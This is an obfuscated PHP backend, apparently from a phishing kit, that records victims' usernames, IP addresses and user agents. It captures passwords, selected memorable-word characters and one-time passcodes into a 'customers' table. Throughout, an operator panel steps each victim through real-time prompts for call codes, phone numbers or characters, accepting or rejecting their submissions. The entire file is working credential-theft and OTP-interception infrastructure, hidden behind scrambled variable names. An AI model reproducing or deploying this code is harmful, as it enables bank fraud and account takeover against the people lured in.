<?php $ {
    "GLOBALS"
}
["poxflixbjt"] = "password";
$ {
    "GLOBALS"
}
["ntwennnkrw"] = "formMem3";
$ {
    "GLOBALS"
}
["hkcnurqomi"] = "formMem2";
$ {
    "GLOBALS"
}
["odogfkfd"] = "id";
$ {
    "GLOBALS"
}
["yliqbg"] = "userid";
$ {
    "GLOBALS"
}
["phhewfqjcpr"] = "stat";
$ {
    "GLOBALS"
}
["fmrmqdn"] = "queryy";
$ {
    "GLOBALS"
}
["asukqowl"] = "value";
$ {
    "GLOBALS"
}
["pniphdp"] = "array";
$ {
    "GLOBALS"
}
["fhpydaln"] = "memo_3rdchar";
$ {
    "GLOBALS"
}
["kqjkrgvdqyq"] = "memo_1stchar";
$ {
    "GLOBALS"
}
["xmoazmq"] = "callcode";
$ {
    "GLOBALS"
}
["rcvauym"] = "callnum";
$ {
    "GLOBALS"
}
["ivwvjllu"] = "memo_2ndchar";
$ {
    "GLOBALS"
}
["ceuggyi"] = "urls";
$ {
    "GLOBALS"
}
["ufqdtzfa"] = "conn";
$ {
    "GLOBALS"
}
["dovhewniv"] = "query";
$ {
    "GLOBALS"
}
["bfrlsz"] = "uniqueid";
$ {
    "GLOBALS"
}
["ybidft"] = "ua";
$ {
    "GLOBALS"
}
["wwkraik"] = "userId";
$ {
    "GLOBALS"
}
["odjftggg"] = "status";
$ {
    "GLOBALS"
}
["rxgqmgjg"] = "num";
include "config.php";
include "connect.php";
session_start();
function numeric($num) {
    if (preg_match("/^[0-9]+\$/", $ {
        $ {
            "GLOBALS"
        }
        ["rxgqmgjg"]
    })) {
        $dqadbsjyune = "status";
        $ {
            $dqadbsjyune
        } = true;
    } else {
        $egliecrhfryc = "status";
        $ {
            $egliecrhfryc
        } = false;
    }
    return $ {
        $ {
            "GLOBALS"
        }
        ["odjftggg"]
    };
}
if ($_GET["type"] == "login") {
    if ($_POST["userId"] and $_POST["ip"] and $_POST["ua"]) {
        $ {
            "GLOBALS"
        }
        ["ebjssrmoo"] = "ip";
        $ {
            $ {
                "GLOBALS"
            }
            ["wwkraik"]
        } = $_POST["userId"];
        $ {
            $ {
                "GLOBALS"
            }
            ["ebjssrmoo"]
        } = $_POST["ip"];
        $ {
            $ {
                "GLOBALS"
            }
            ["ybidft"]
        } = urlencode($_POST["ua"]);
        $ {
            $ {
                "GLOBALS"
            }
            ["bfrlsz"]
        } = time();
        if ($_SESSION["started"] == "true") {
            $ {
                "GLOBALS"
            }
            ["qrwyednuuq"] = "query";
            $ {
                "GLOBALS"
            }
            ["hgxhvviibef"] = "conn";
            $kwybvekmoh = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["bfrlsz"]
            } = $_SESSION["uniqueid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["qrwyednuuq"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["hgxhvviibef"]
            }, "UPDATE customers SET status=1, buzzed=0, username='$userId', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
            if ($ {
                $kwybvekmoh
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            $ {
                "GLOBALS"
            }
            ["sohuobcgkh"] = "uniqueid";
            $_SESSION["uniqueid"] = $ {
                $ {
                    "GLOBALS"
                }
                ["sohuobcgkh"]
            };
            $_SESSION["started"] = "true";
            $phfmihge = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["ufqdtzfa"]
            }, "INSERT INTO customers (username , ip, useragent,uniqueid, status) VALUES ('$userId', '$ip', '$ua',$uniqueid, 1)");
            if ($ {
                $phfmihge
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
}


if ($_SESSION["admin_logged"] == "true") {
    if ($_GET["type"] == "commmand") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true and $_POST["status"] and numeric($_POST["status"]) == true or ($_POST["1stchar"] and $_POST["2ndchar"] and $_POST["3rdchar"]) or $_POST["callcode"] or $_POST["callnum"]) {
            $ppnjwxsswhxp = "callnum";
            $ {
                "GLOBALS"
            }
            ["okeettoigxlo"] = "memo_1stchar";
            $enxevfig = "userid";
            $fctlbxals = "memo_3rdchar";
            $oysrsvbimovr = "callnum";
            $ {
                "GLOBALS"
            }
            ["yhtkxsddykzf"] = "memo_3rdchar";
            $szwwvqohffr = "status";
            $ {
                "GLOBALS"
            }
            ["nprgqslgi"] = "callcode";
            $virgwim = "memo_2ndchar";
            $bddbjzvvbkqe = "memo_1stchar";
            $ {
                "GLOBALS"
            }
            ["gdqhlosv"] = "memo_1stchar";
            $avgtrxbrao = "callcode";
            $qurxcpqehrsd = "memo_3rdchar";
            $ {
                $enxevfig
            } = $_POST["userid"];
            $ {
                $szwwvqohffr
            } = $_POST["status"];
            $ {
                "GLOBALS"
            }
            ["rxzoyrrq"] = "callcode";
            $ {
                $bddbjzvvbkqe
            } = $_POST["1stchar"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ivwvjllu"]
            } = $_POST["2ndchar"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["yhtkxsddykzf"]
            } = $_POST["3rdchar"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["rxzoyrrq"]
            } = $_POST["callcode"];
            $ {
                "GLOBALS"
            }
            ["nkhhciq"] = "memo_2ndchar";
            $ {
                $ {
                    "GLOBALS"
                }
                ["rcvauym"]
            } = $_POST["callnum"];
            $ {
                "GLOBALS"
            }
            ["slgwvpnsofej"] = "callcode";
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["xmoazmq"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["xmoazmq"]
            } != "" and ($ {
                $ {
                    "GLOBALS"
                }
                ["okeettoigxlo"]
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["kqjkrgvdqyq"]
            } == "") and ($ {
                $ {
                    "GLOBALS"
                }
                ["ivwvjllu"]
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["ivwvjllu"]
            } == "") and ($ {
                $qurxcpqehrsd
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["fhpydaln"]
            } == "") and ($ {
                $oysrsvbimovr
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["rcvauym"]
            } == "")) {
                $kkcecxkcovh = "conn";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["dovhewniv"]
                } = mysqli_query($ {
                    $kkcecxkcovh
                }, "UPDATE customers SET status=$status, code='$callcode' WHERE id=$userid");
            } elseif ($ {
                $ {
                    "GLOBALS"
                }
                ["kqjkrgvdqyq"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["gdqhlosv"]
            } != "" and $ {
                $ {
                    "GLOBALS"
                }
                ["ivwvjllu"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["ivwvjllu"]
            } != "" and $ {
                $ {
                    "GLOBALS"
                }
                ["fhpydaln"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["fhpydaln"]
            } != "" and ($ {
                $ {
                    "GLOBALS"
                }
                ["slgwvpnsofej"]
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["nprgqslgi"]
            } == "") and ($ {
                $ppnjwxsswhxp
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["rcvauym"]
            } == "")) {
                $otroplnvh = "conn";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["dovhewniv"]
                } = mysqli_query($ {
                    $otroplnvh
                }, "UPDATE customers SET status=$status, askchar1='$memo_1stchar',askchar2='$memo_2ndchar',askchar3='$memo_3rdchar' WHERE id=$userid");
            } elseif ($ {
                $ {
                    "GLOBALS"
                }
                ["rcvauym"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["rcvauym"]
            } != "" and ($ {
                $ {
                    "GLOBALS"
                }
                ["kqjkrgvdqyq"]
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["kqjkrgvdqyq"]
            } == "") and ($ {
                $virgwim
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["nkhhciq"]
            } == "") and ($ {
                $ {
                    "GLOBALS"
                }
                ["fhpydaln"]
            } == null or $ {
                $fctlbxals
            } == "") and ($ {
                $avgtrxbrao
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["xmoazmq"]
            } == "")) {
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["dovhewniv"]
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["ufqdtzfa"]
                }, "UPDATE customers SET status=$status, phonenumber='$callnum' WHERE id=$userid");
            } else {
                $hnmmpxigl = "query";
                $ {
                    $hnmmpxigl
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["ufqdtzfa"]
                }, "UPDATE customers SET status=$status WHERE id=$userid");
            }
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
    if (isset($_GET["get_submitted"])) {
        $ {
            $ {
                "GLOBALS"
            }
            ["dovhewniv"]
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["ufqdtzfa"]
        }, "SELECT * FROM customers WHERE (status=1 and buzzed=0) or (buzzed=0 and status=13)");
        $ {
            "GLOBALS"
        }
        ["uxwmhyzrn"] = "query";
        if ($ {
            $ {
                "GLOBALS"
            }
            ["uxwmhyzrn"]
        }) {
            $qsbldkklhpgu = "num";
            $ {
                $qsbldkklhpgu
            } = mysqli_num_rows($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            });
            $ {
                $ {
                    "GLOBALS"
                }
                ["pniphdp"]
            } = mysqli_fetch_array($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }, MYSQLI_ASSOC);
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["rxgqmgjg"]
            } >= 1) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if (isset($_GET["buzzoff"])) {
        $hdjwudtz = "query";
        $ {
            "GLOBALS"
        }
        ["ohbzfrxk"] = "conn";
        $ {
            $hdjwudtz
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["ohbzfrxk"]
        }, "SELECT * FROM customers WHERE status=1 OR status=13");
        if ($ {
            $ {
                "GLOBALS"
            }
            ["dovhewniv"]
        }) {
            $mwwllywx = "array";
            $ {
                "GLOBALS"
            }
            ["nwfrpnfmkkip"] = "query";
            $ {
                $mwwllywx
            } = array_filter(mysqli_fetch_all($ {
                $ {
                    "GLOBALS"
                }
                ["nwfrpnfmkkip"]
            }, MYSQLI_ASSOC));
            foreach ($ {
                $ {
                    "GLOBALS"
                }
                ["pniphdp"]
            } as $ {
                $ {
                    "GLOBALS"
                }
                ["asukqowl"]
            }) {
                $ {
                    "GLOBALS"
                }
                ["fuhqlvelx"] = "userid";
                $ {
                    "GLOBALS"
                }
                ["huulknnyuz"] = "queryy";
                $ {
                    "GLOBALS"
                }
                ["xjtxwflly"] = "conn";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["fuhqlvelx"]
                } = $ {
                    $ {
                        "GLOBALS"
                    }
                    ["asukqowl"]
                }
                ["id"];
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["fmrmqdn"]
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["xjtxwflly"]
                }, "UPDATE customers SET buzzed=1 WHERE id=$userid");
                if ($ {
                    $ {
                        "GLOBALS"
                    }
                    ["huulknnyuz"]
                }) {
                    $ {
                        $ {
                            "GLOBALS"
                        }
                        ["phhewfqjcpr"]
                    } = "ok";
                } else {
                    $ {
                        $ {
                            "GLOBALS"
                        }
                        ["phhewfqjcpr"]
                    } = "notok";
                }
            }
            $vfldewo = "stat";
            if ($ {
                $vfldewo
            } == "ok") {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if ($_GET["type"] == "delete") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                $ {
                    "GLOBALS"
                }
                ["yliqbg"]
            } = $_POST["userid"];
            $mlyhdjbsg = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["ufqdtzfa"]
            }, "DELETE FROM customers WHERE id=$userid");
            if ($ {
                $mlyhdjbsg
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
    if ($_GET["type"] == "submitted") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true) {
            $rdfpzenmi = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["yliqbg"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["odjftggg"]
            } = str_replace("_$userid", "", $_POST["status"]);
            $ehpfgopxhjn = "query";
            $ {
                "GLOBALS"
            }
            ["vpehmiv"] = "status";
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["vpehmiv"]
            } == "accept") {
                $yzftokuto = "status";
                $ {
                    $yzftokuto
                } = 11;
            } elseif ($ {
                $ {
                    "GLOBALS"
                }
                ["odjftggg"]
            } == "reject") {
                $ {
                    "GLOBALS"
                }
                ["ujyomlcjrkm"] = "status";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["ujyomlcjrkm"]
                } = 12;
            } else {
                echo json_encode(array("status" => "notok"));
            }
            $ {
                $ehpfgopxhjn
            } = mysqli_query($ {
                $rdfpzenmi
            }, "UPDATE customers SET status=$status WHERE id=$userid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
}

if ($_SESSION["started"] == "true") {
    if ($_GET["wait"] and numeric($_GET["wait"]) == true) {
        $vmramwdknl = "query";
        $ {
            $ {
                "GLOBALS"
            }
            ["odogfkfd"]
        } = $_GET["wait"];
        $ {
            $vmramwdknl
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["ufqdtzfa"]
        }, "UPDATE customers SET status=0 WHERE uniqueid=$id");
        if ($ {
            $ {
                "GLOBALS"
            }
            ["dovhewniv"]
        }) {
            echo json_encode(array("status" => "ok"));
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if ($_GET["getstatus"] and numeric($_GET["getstatus"]) == true) {
        $ {
            "GLOBALS"
        }
        ["wvmtnsdvnkp"] = "query";
        $ {
            $ {
                "GLOBALS"
            }
            ["odogfkfd"]
        } = $_GET["getstatus"];
        $mkuqnwtkby = "query";
        $ {
            $mkuqnwtkby
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["ufqdtzfa"]
        }, "SELECT * from customers WHERE uniqueid='$id'");
        if (mysqli_num_rows($ {
            $ {
                "GLOBALS"
            }
            ["wvmtnsdvnkp"]
        }) >= 1) {
            $odpvmgpjfq = "array";
            $ujzurnr = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["pniphdp"]
            } = mysqli_fetch_array($ {
                $ujzurnr
            }, MYSQLI_ASSOC);
            echo $ {
                $odpvmgpjfq
            }
            ["status"];
        }
    }
    if ($_GET["type"] == "password") {
        if ($_POST["charXPos"] and $_POST["charYPos"] and $_POST["charZPos"] and $_POST["password"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                "GLOBALS"
            }
            ["awlvzlhg"] = "formMem1";
            $ {
                $ {
                    "GLOBALS"
                }
                ["awlvzlhg"]
            } = $_POST["charXPos"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["hkcnurqomi"]
            } = $_POST["charYPos"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ntwennnkrw"]
            } = $_POST["charZPos"];
            $ {
                "GLOBALS"
            }
            ["xjqlbucasrw"] = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["poxflixbjt"]
            } = $_POST["password"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["bfrlsz"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["xjqlbucasrw"]
            }, "UPDATE customers SET password='$password', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
    if ($_GET["type"] == "memo") {
        if ($_POST["charXPos"] and $_POST["charYPos"] and $_POST["charZPos"] and $_POST["password"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                "GLOBALS"
            }
            ["awlvzlhg"] = "formMem1";
            $ {
                $ {
                    "GLOBALS"
                }
                ["awlvzlhg"]
            } = $_POST["charXPos"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["hkcnurqomi"]
            } = $_POST["charYPos"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ntwennnkrw"]
            } = $_POST["charZPos"];
            $ {
                "GLOBALS"
            }
            ["xjqlbucasrw"] = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["poxflixbjt"]
            } = $_POST["password"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["bfrlsz"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["xjqlbucasrw"]
            }, "UPDATE customers SET char1='$formMem1',char2='$formMem2',char3='$formMem3', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
    if ($_GET["type"] == "otp") {
        if ($_POST["OTPInput"] and $_POST["userid"] and numeric($_POST["OTPInput"]) == true and numeric($_POST["userid"]) == true) {
            $iwhgss = "query";
            $ {
                "GLOBALS"
            }
            ["arqyrkk"] = "OTPInput";
            $ {
                "GLOBALS"
            }
            ["rihckcb"] = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["arqyrkk"]
            } = $_POST["OTPInput"];
            $vapwfjynxvhk = "uniqueid";
            $ {
                $vapwfjynxvhk
            } = $_POST["userid"];
            $ {
                $iwhgss
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["rihckcb"]
            }, "UPDATE customers SET otp='$OTPInput',status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["dovhewniv"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
}
?>